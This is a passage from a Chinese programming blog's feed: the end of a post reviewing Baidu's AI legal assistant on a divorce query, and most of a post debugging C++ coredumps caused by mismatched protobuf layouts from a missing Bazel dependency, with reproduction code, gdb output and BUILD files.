的“人情味”</h2><p>这里比较让我意外的是，法行宝后面还给了一个行动建议。其中有部分建议有那么一丝“人情味”，比如：</p><blockquote><p>假如你不幸离婚，可以大哭几场，把心中的郁闷气息释放，然后把自己的喜怒哀乐全部讲给家人听，如果不愿意讲给家人听，可以讲给朋友、同学、老师，这样可以使你的心情放松，然后慢慢做到真正的放下。<br>假如你不幸离婚，将离婚当作人生的一次经历，告诉自己已经对这段婚姻尽力了，可以无遗憾的换一个新的生活方式，所以，该吃饭的时候吃饭，该工作的时候工作，爱干什么就干什么，回归到现实生活中来，勇敢的面对现实。</p></blockquote><p>哈哈，原以为 AI <strong>只是提供冰冷的法律帮助</strong>，<strong>没想到还能安慰人</strong>，这可太让我意外了。</p><h2 id="AI-的扩展资料"><a href="#AI-的扩展资料" class="headerlink" title="AI 的扩展资料"></a>AI 的扩展资料</h2><p>在最后，法行宝还给出了<strong>涉及到的法律法规和一些参考案例</strong>，方便进一步去深入。不过普通人怕是没时间，没精力去继续研究这些了吧，感觉对我们律师倒还挺有帮助的呢。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_suggestion_4.png" alt="AI 给出法律法规和参考案例"></p><p>最后，大家觉得<strong>法行宝这类 AI 工具，会不会取代律师呢？如果你遇到一些法律问题，会去尝试这些智能助手，还是来找小盛律师呢。</strong></p>]]></content>
    
    
    <summary type="html">本文探讨了人工智能在法律行业的应用，以百度法行宝为例，通过分析离婚案件的处理流程，展示了AI法律助手的强大功能。文章详细介绍了法行宝的预设问题、生成的法律意见书、离婚流程指引以及相关法律文书，并对其&quot;人情味&quot;表现给出评论。最后提出了AI工具是否会取代律师的疑问，引发了对法律服务行业未来发展的思考。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>Bazel 依赖缺失导致的 C++ 进程 coredump 问题分析</title>
    <link href="https://selfboot.cn/2024/03/15/object_memory_coredump/"/>
    <id>https://selfboot.cn/2024/03/15/object_memory_coredump/</id>
    <published>2024-03-15T20:35:16.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>最近在项目中遇到了一个奇怪的 coredump 问题，排查过程并不顺利。经过不断分析，找到了一个复现的步骤，经过合理猜测和谨慎验证，最终才定位到原因。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231123_object_memory_coredump_cover.png" alt="C++ coredump bazel依赖缺失"></p><p>复盘下来，发现这类 coredump 问题确实比较罕见，排查起来也不是很容易。只有项目代码<strong>编译依赖管理不是很合理的时候</strong>，才可能出现。另外，在复盘过程中，对这里的 coredump 以及 <strong>C++ 对象内存分布</strong>也有了更多理解。于是整理一篇文章，如有错误，欢迎指正。</p><span id="more"></span><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>先说下后台服务的基本架构，最外面是 cgi 层处理 nginx 转发的 http 请求，然后具体业务在中间的逻辑层处理。逻辑层是微服务框架，不同服务之间通过 RPC 调用，用的类似 <a href="https://grpc.io/">grpc</a>。</p><p>某次变更，在服务 A 的 <code>service.proto</code> 文件中，对某个 rpc 请求参数增加了一个字段(比如下面的 age)：</p><figure class="highlight proto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">service </span><span class="title class_">Greeter</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloRequest</span> &#123;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="type">string</span> age = <span class="number">2</span>;   <span class="comment">// 增加了参数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后增加了这个字段的相关逻辑，随后编译上线了该模块。我们知道在微服务架构中，经常<strong>有多个服务共用同一个 proto 对象</strong>。如果要修改 proto 的话，一般都是<strong>增加字段</strong>，这样对调用方和被调用方都是兼容的。这里服务 A 上线后，用新的 proto，其他用到这个 proto 的服务在重新编译前都会用老的版本，这样不会有问题。其实严格来说这样也是可能有问题的，之前踩过坑，主要是 Merge 的兼容问题，可以参考我之前的文章 <a href="https://selfboot.cn/2023/09/09/protobuf_field_merge/">Protobuf 序列化消息引起的存储失败问题分析</a>。</p><p>正常来说，如果其他服务想更新 proto，只需要重新编译就能用到新的 proto，肯定不会有问题。不过这次就出问题了，<strong>服务 A 的 proto 增加字段上线后，其他通过 client 调用 A 的服务，只要重新编译上线，就会 coredump</strong>。</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>这里看了现网的 core 文件，没有发现特别有用的信息(通过 core 文件定位问题的功力还是不太够)。就想着先看看能不能稳定复现一下，毕竟对于 core 的问题，如果能稳定复现，问题基本就解决一大半了。好在通过一番尝试，找到了一个可以稳定复现的步骤。</p><h3 id="老版本-proto"><a href="#老版本-proto" class="headerlink" title="老版本 proto"></a>老版本 proto</h3><p>创建一个最初版本的 proto 文件，这里就叫 data.proto，并用 protoc 编译为 <code>data.pb.h</code> 和 <code>data.pb.cc</code>，其中 proto 文件内容如下：</p><figure class="highlight proto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"><span class="keyword">message </span><span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令也很简单，<code>protoc --cpp_out=. data.proto</code> 即可。此外，还有一个 libdata.cpp 文件，定义了一个 processData 函数，使用了上面的 proto 对象。这个cpp文件被编译进了一个公共库 <code>libdata.so</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libdata.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.pb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> example::Data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">processData</span><span class="params">(Data &amp;req)</span> </span>&#123;</span><br><span class="line">    Data data;</span><br><span class="line">    data.<span class="built_in">set_message</span>(<span class="string">&quot;Hello from lib&quot;</span>);</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;In lib, data size: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(data)&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;In lib, data  msg: &quot;</span> &lt;&lt; data.<span class="built_in">message</span>()&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;In lib, req size: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req)&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;In lib, req  msg: &quot;</span> &lt;&lt; req.<span class="built_in">message</span>()&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为动态库的命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -shared libdata.cpp data.pb.cc -o libdata.so -lprotobuf -g</span><br></pre></td></tr></table></figure><p>这样我们就有了 <code>libdata.so</code> 动态库文件了。</p><h3 id="更新-proto"><a href="#更新-proto" class="headerlink" title="更新 proto"></a>更新 proto</h3><p>接下来我们修改下 data.proto 文件，增加一个 <strong>repeated 字段</strong>，如下：</p><figure class="highlight proto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"><span class="keyword">message </span><span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">repeated</span> <span class="type">int32</span> users = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后重新用 protoc 编译 proto 文件</strong>。接着写我们的主程序，就叫 <code>main.cpp</code>，只是简单调用前面 <code>libdata.so</code> 库中的函数，内容如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.pb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> example::Data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">void</span> <span class="title">processData</span><span class="params">(Data&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Data req;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    req.<span class="built_in">set_message</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">processData</span>(req);  <span class="comment">// 调用库函数</span></span><br><span class="line">    std::cout &lt;&lt; req.<span class="built_in">message</span>() &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译链接我们的主程序，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp -o main -L. -lprotobuf -Wl,-rpath,. -ldata -g</span><br></pre></td></tr></table></figure><p>这里需要注意的是，我们的 <code>libdata.so</code> 库文件在当前目录，所以需要用 <code>-Wl,-rpath,.</code> 指定下动态库的搜索路径。然后运行程序，就会必现 coredump，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240131_object_memory_coredump_reproduced.png" alt="成功复现 coredump"></p><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>大多时候，能稳定复现 coredump，基本就很容易找到 coredump 的原因了。用 <code>-g</code> 编译带上调试信息，然后就可以用 gdb 跟踪排查。因为在 <code>set_message</code> 这里会 core 掉，所以我们在这里打个断点，先查看下 req 对象的内存布局，然后执行到 core，查看堆栈即可。整体的结果如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240315_object_memory_coredump_gdb_message.png" alt="gdb 查看 coredump 内存布局"></p><p>先用 GDB 打印 req 的内容，<strong>比较奇怪的是这里只有 message 字段，并没有看到 users 字段</strong>。然后执行到 <code>req.set_message(&quot;test&quot;);</code> 这里，从 coredump 的堆栈来看，set_message 这里调用 this 和 value 地址都没问题。但是底层 <code>ArenaStringPtr::Set</code> 的时候，this 的地址是 <code>0x7fffffffe3a8</code>，这个感觉应该是 message 字段的地址。从前面输出来看，应该是 <code>0x7fffffffe390</code> 才对(这里不太确定，后面会验证这点)。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">....</span><br><span class="line">#<span class="number">2</span>  <span class="number">0</span>x000055<span class="number">55555564e6</span> in googl<span class="number">e::</span>protobu<span class="number">f::</span>internal<span class="number">::</span>ArenaStringPtr<span class="number">::</span>Set (this=<span class="number">0</span>x7fffffffe3a8,</span><br><span class="line">    default_value=<span class="number">0</span>x<span class="number">555555559100</span> &lt;googl<span class="number">e::</span>protobu<span class="number">f::</span>internal<span class="number">::</span>fixed_address_empty_string[abi:cxx11]&gt;,</span><br><span class="line">    value=&quot;test&quot;, arena=<span class="number">0</span>x0) at /usr/include/google/protobuf/arenastring.h:<span class="number">81</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0</span>x00005<span class="number">55555556948</span> in exampl<span class="number">e::</span>Dat<span class="number">a::</span>set_message (this=<span class="number">0</span>x7fffffffe380, value=<span class="number">0</span>x55<span class="number">55555570f0</span> &quot;test&quot;)</span><br><span class="line">    at data.pb.h:<span class="number">288</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0</span>x00005<span class="number">55555556312</span> in main () at main.cpp:<span class="number">12</span></span><br></pre></td></tr></table></figure><p>coredump 的直接原因就是 message 字段的内存地址错误。那么什么原因导致内存地址错了呢？这里就要回顾下我们的编译、运行过程了。我们知道在 C++ 中，<strong>对象的内存布局是由其类的定义决定的</strong>，这通常在头文件（.h）中给出。当编译一个 C++ 程序时，编译器根据类的定义（包括成员变量的类型、数量、顺序等）来确定每个对象的大小和内存布局。具体到我们这里 Protobuf 生成的 C++ 类，类的定义通常包含在 .pb.h 文件中，而 <code>.pb.cc</code> 文件则包含这些类的方法的实现，包含字段访问器（如 set_message 和 message）和其他成员函数的实现。这些实现负责<strong>实际的数据操作，如分配内存、修改字段值、生成对象的字符串表示</strong>等。</p><h3 id="对象内存分布"><a href="#对象内存分布" class="headerlink" title="对象内存分布"></a>对象内存分布</h3><p>我们上面的编译过程，主程序 <code>main.cpp</code> 使用了新版本的 <code>data.pb.h</code>，因此 main 中的 Data 对象<strong>按照新的内存布局</strong>进行编译。这里对象的内存布局包括成员变量的排列、对象的总大小以及可能的填充（为了满足对齐要求），所以 <strong>main 中的 Data 对象是包含了 users 字段的</strong>。怎么验证这一点呢？很简单，我们可以在 main 中打印下 Data 对象的大小，如下先<strong>注释掉会导致 coredump 的 set_message 以及读取 message 的代码</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.pb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> example::Data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">void</span> <span class="title">processData</span><span class="params">(Data&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Data req;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// req.set_message(&quot;test&quot;);</span></span><br><span class="line">    <span class="built_in">processData</span>(req);  <span class="comment">// 调用库函数</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; req.message() &lt;&lt; std::endl;</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重新编译链接，运行程序，输出如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main:</span> <span class="number">56</span></span><br><span class="line"><span class="keyword">In</span> <span class="keyword">lib</span>, data size: <span class="number">32</span></span><br><span class="line"><span class="keyword">In</span> <span class="keyword">lib</span>, data  msg: Hello <span class="keyword">from</span> <span class="keyword">lib</span></span><br><span class="line"><span class="keyword">In</span> <span class="keyword">lib</span>, req size: <span class="number">32</span></span><br><span class="line"><span class="keyword">In</span> <span class="keyword">lib</span>, req  msg:</span><br><span class="line"><span class="symbol">main:</span> <span class="number">56</span></span><br></pre></td></tr></table></figure><p>可以看到 <strong>main 中 data 的大小是 56，而 lib 中的 data 大小是 32</strong>。通过这个验证，我们可以确定 main 中的 Data 对象是包含了 users 字段的，所以会比 lib 中的 Data 对象大。</p><p>既然包含了 users 字段，为什么前面<strong>gdb 打印 main.cpp 中的 req 对象的时候，又不包含 users 字段呢？</strong>我们知道，GDB 之所以能输出对象成员、局部变量等信息，是用到了二进制文件中的<strong>符号表信息</strong>，gcc 编译的时候带上<code>-g</code>就会有这些调试信息。对于 pb 对象来说，这些调试信息是在 <code>.pb.cc</code> 文件中，包含了如何序列化和反序列化字段、如何进行内存管理（包括对于动态分配的字段如字符串和重复字段的处理）等逻辑。</p><p>我们再仔细回顾下前面 main 的编译链接命令，其实我们链接到的是动态库 libdata.so 中的老的 data.pb.cc 实现，这个版本的实现中并没有 users 字段。所以 gdb 打印的时候，无法显示出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp -o main -L. -lprotobuf -Wl,-rpath,. -ldata -g</span><br></pre></td></tr></table></figure><p>其实这里还有个问题需要解释下，为什么前面注释掉 set_message 以及读取 message 的代码，程序就没有 core 了呢？这是因为 main 程序不再尝试修改或访问 req 对象的内容，尽管 req 对象的内存布局与 libdata.so 中的不匹配，但由于没有实际操作这些不一致的内存区域，所以并不会触发非法内存访问。</p><h3 id="链接新版本-pb"><a href="#链接新版本-pb" class="headerlink" title="链接新版本 pb"></a>链接新版本 pb</h3><p>前面我们链接 main 的时候，用的是动态库里面的老的 <code>data.pb.cc</code>，如果改成链接新的 <code>data.pb.cc</code>，程序还会 core 吗？我们稍微改下前面的编译链接命令，注意 main.cpp 中仍然注释 set_message 部分：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp data.pb.cc  -o main -L. -lprotobuf -Wl,-rpath,. -ldata -g</span><br></pre></td></tr></table></figure><p>新的链接命令只用把 <code>data.pb.cc</code> 放在 <code>-ldata</code> 前面，就会链接到新的pb实现。这里链接符号决议的过程，可以参考我之前的文章<a href="https://selfboot.cn/2023/09/19/c++_symbol_resolution/">深入理解 C++ 链接符号决议：从符号重定义说起</a>。</p><p>编译好后运行程序，发现果然又 core 了，不过这次 core 的位置在 <code>libdata.cpp</code> 中的 <code>processData</code> 函数中，具体在 <code>data.set_message(&quot;Hello from lib&quot;);</code> 这里，如下图所示：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240314_object_memory_coredump_core_inlib.png" alt="改变链接顺序后继续 coredump"></p><p>这是因为我们的 <code>libdata.so</code> 中的 Data 对象定义是用的老的 <code>data.pb.h</code>，而链接到的实现又是新的<code>data.pb.cc</code>，导致对象不一致，所以内存会错乱导致 core。</p><p>这里 <strong>core 的位置也挺有意思的</strong>，如果 main.cpp 不注释 set_message 部分，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Data req;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    req.<span class="built_in">set_message</span>(<span class="string">&quot;test&quot;</span>);    <span class="comment">// 不注释这里</span></span><br><span class="line">    <span class="built_in">processData</span>(req);  <span class="comment">// 调用库函数</span></span><br><span class="line">    std::cout &lt;&lt; req.<span class="built_in">message</span>() &lt;&lt; std::endl; <span class="comment">// 不注释这里</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序并没有 core 在动态库 processData 中，反而是 core 在 main 中的 <code>req.message()</code> 了。大概是因为 processData 中访问对象<strong>凑巧</strong>没有错乱，直到 main 中访问 <code>req.message()</code> 的时候才触发内存错误。那么如果把 <code>req.message()</code> 这行也注释呢，如下代码还会 core 吗？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Data req;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    req.<span class="built_in">set_message</span>(<span class="string">&quot;test&quot;</span>);    <span class="comment">// 不注释这里</span></span><br><span class="line">    <span class="built_in">processData</span>(req);  <span class="comment">// 调用库函数</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; req.message() &lt;&lt; std::endl; // 注释这里！！！</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main: &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(req) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行后发现程序运行到了 return，打印了所有内容，但最后还是 core 掉。输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">g++ main.cpp data.pb.cc  -o main -L. -lprotobuf -Wl,-rpath,. -ldata -g</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./main</span></span><br><span class="line">main: 56</span><br><span class="line">In lib, data size: 32</span><br><span class="line">In lib, data  msg: Hello from lib</span><br><span class="line">In lib, req size: 32</span><br><span class="line">In lib, req  msg: test</span><br><span class="line">main: 56</span><br><span class="line">[1]    1302869 segmentation fault  ./main</span><br></pre></td></tr></table></figure><p>具体 core 的位置在 main 中 req 对象的析构过程，通过 GDB 可以发现，在 processData 处理之前，打印 req 也能看到 user 字段。但是 processData 后，req 的<strong>内存地址直接变成了一个非法地址</strong>，所以后续析构出错。整体 GDB 过程如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240315_object_memory_coredump_core_destroy.png" alt="core 在了析构函数"></p><p>这里再补充说下，其实在 processData 中处理 req 的时候，因为 Data 对象的定义和实现有两个版本，导致 req 的内存地址错乱，只是<strong>凑巧</strong>这个函数里面的操作没有因为内存问题 core 掉，直到 main 中析构，才最终触发 core。</p><h2 id="正常情况下内存分析"><a href="#正常情况下内存分析" class="headerlink" title="正常情况下内存分析"></a>正常情况下内存分析</h2><p>上面程序 core 的根源在于，<strong>在一个可执行文件中，用到了不同版本的 data.pb.h 和 data.pb.cc，从而导致内存读、写异常</strong>。接下来我们看看正常情况下，整个过程中 pb 对象的内存分布是怎样的。同时验证下前面遗留的一个猜测：底层 <code>ArenaStringPtr::Set</code> 的时候，this 的地址是 <code>0x7fffffffe3a8</code>，这个是 message 字段的地址。</p><p>首先用新版本 data.pb.cc 重新生成动态库，然后重新编译 main 程序，运行结果如下，一切正常。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./main</span><br><span class="line">main: 56</span><br><span class="line">In lib, data size: 56</span><br><span class="line">In lib, data  msg: Hello from lib</span><br><span class="line">In lib, req size: 56</span><br><span class="line">In lib, req  msg: test</span><br><span class="line">main: 56</span><br></pre></td></tr></table></figure><p>接着用 GDB 来分析下，可以打印 req 对象，里面有 users 和 message 字段，拿到 message 的地址，可以看到和后面的 <code>ArenaStringPtr::Set</code> 中 this 的地址是一样的。并且在经过 processData 处理后，这里 req 对象的内存地址并没有变化，说明这里的内存操作是正常的。整体 GDB 过程如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240315_object_memory_coredump_gdb_normal.png" alt="正常情况下的 GDB 内存查看"></p><h2 id="bazel-依赖缺失"><a href="#bazel-依赖缺失" class="headerlink" title="bazel 依赖缺失"></a>bazel 依赖缺失</h2><p>让我们回到文章开始介绍的业务背景中去，业务中c++项目依赖比较多，用 bazel 来做依赖管理。有问题的 build 文件大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">proto_library(</span><br><span class="line">    name = &quot;data_proto&quot;,</span><br><span class="line">    srcs = [&quot;data.proto&quot;],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cc_proto_library(</span><br><span class="line">    name = &quot;data_cc_proto&quot;,</span><br><span class="line">    deps = [&quot;:data_proto&quot;],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cc_library(</span><br><span class="line">    name = &quot;libdata&quot;,</span><br><span class="line">    srcs = [&quot;libdata.cpp&quot;],</span><br><span class="line">    includes = [&quot;.&quot;],         # 万恶之源</span><br><span class="line"></span><br><span class="line">    # deps = [&quot;:data_cc_proto&quot;], # 漏掉了这个关键的依赖</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cc_binary(</span><br><span class="line">    name = &quot;main&quot;,</span><br><span class="line">    srcs = [&quot;main.cpp&quot;],</span><br><span class="line">    deps = [&quot;:libdata&quot;, &quot;:data_cc_proto&quot;],</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里 libdata 的依赖其实是不完整的，正常是要依赖到 data_cc_proto 才对，但是这里并没有。在某次更新 data.proto 后，重新编译 main，<strong>bazel 分析依赖关系，发现声明的依赖里没有用到 data.proto(实际有依赖到)，所以不会重新编译 libdata</strong>。导致 libdata 里面的 Data 对象定义还是老版本的，而 main 中的 Data 对象会用新版本，这样就会导致前面的内存错乱，最终 coredump。</p><p>其实上面 libdata 要能编译过，得找到 <code>data.pb.h</code> 头文件才行。这里使用了 <code>includes = [&quot;.&quot;]</code> 这种写法，允许一个规则及其所有传递依赖包含工作区内任意位置的头文件。这种写法有很多问题，比如会使得库的封装性和可维护性降低，构建速度变慢。<strong>最新版本的 bazel 其实已经禁止了这种写法</strong>，老版本的 bazel 也是不推荐的。</p><p>我们项目中，因为要兼容比较老版本的 protobuf(2.6 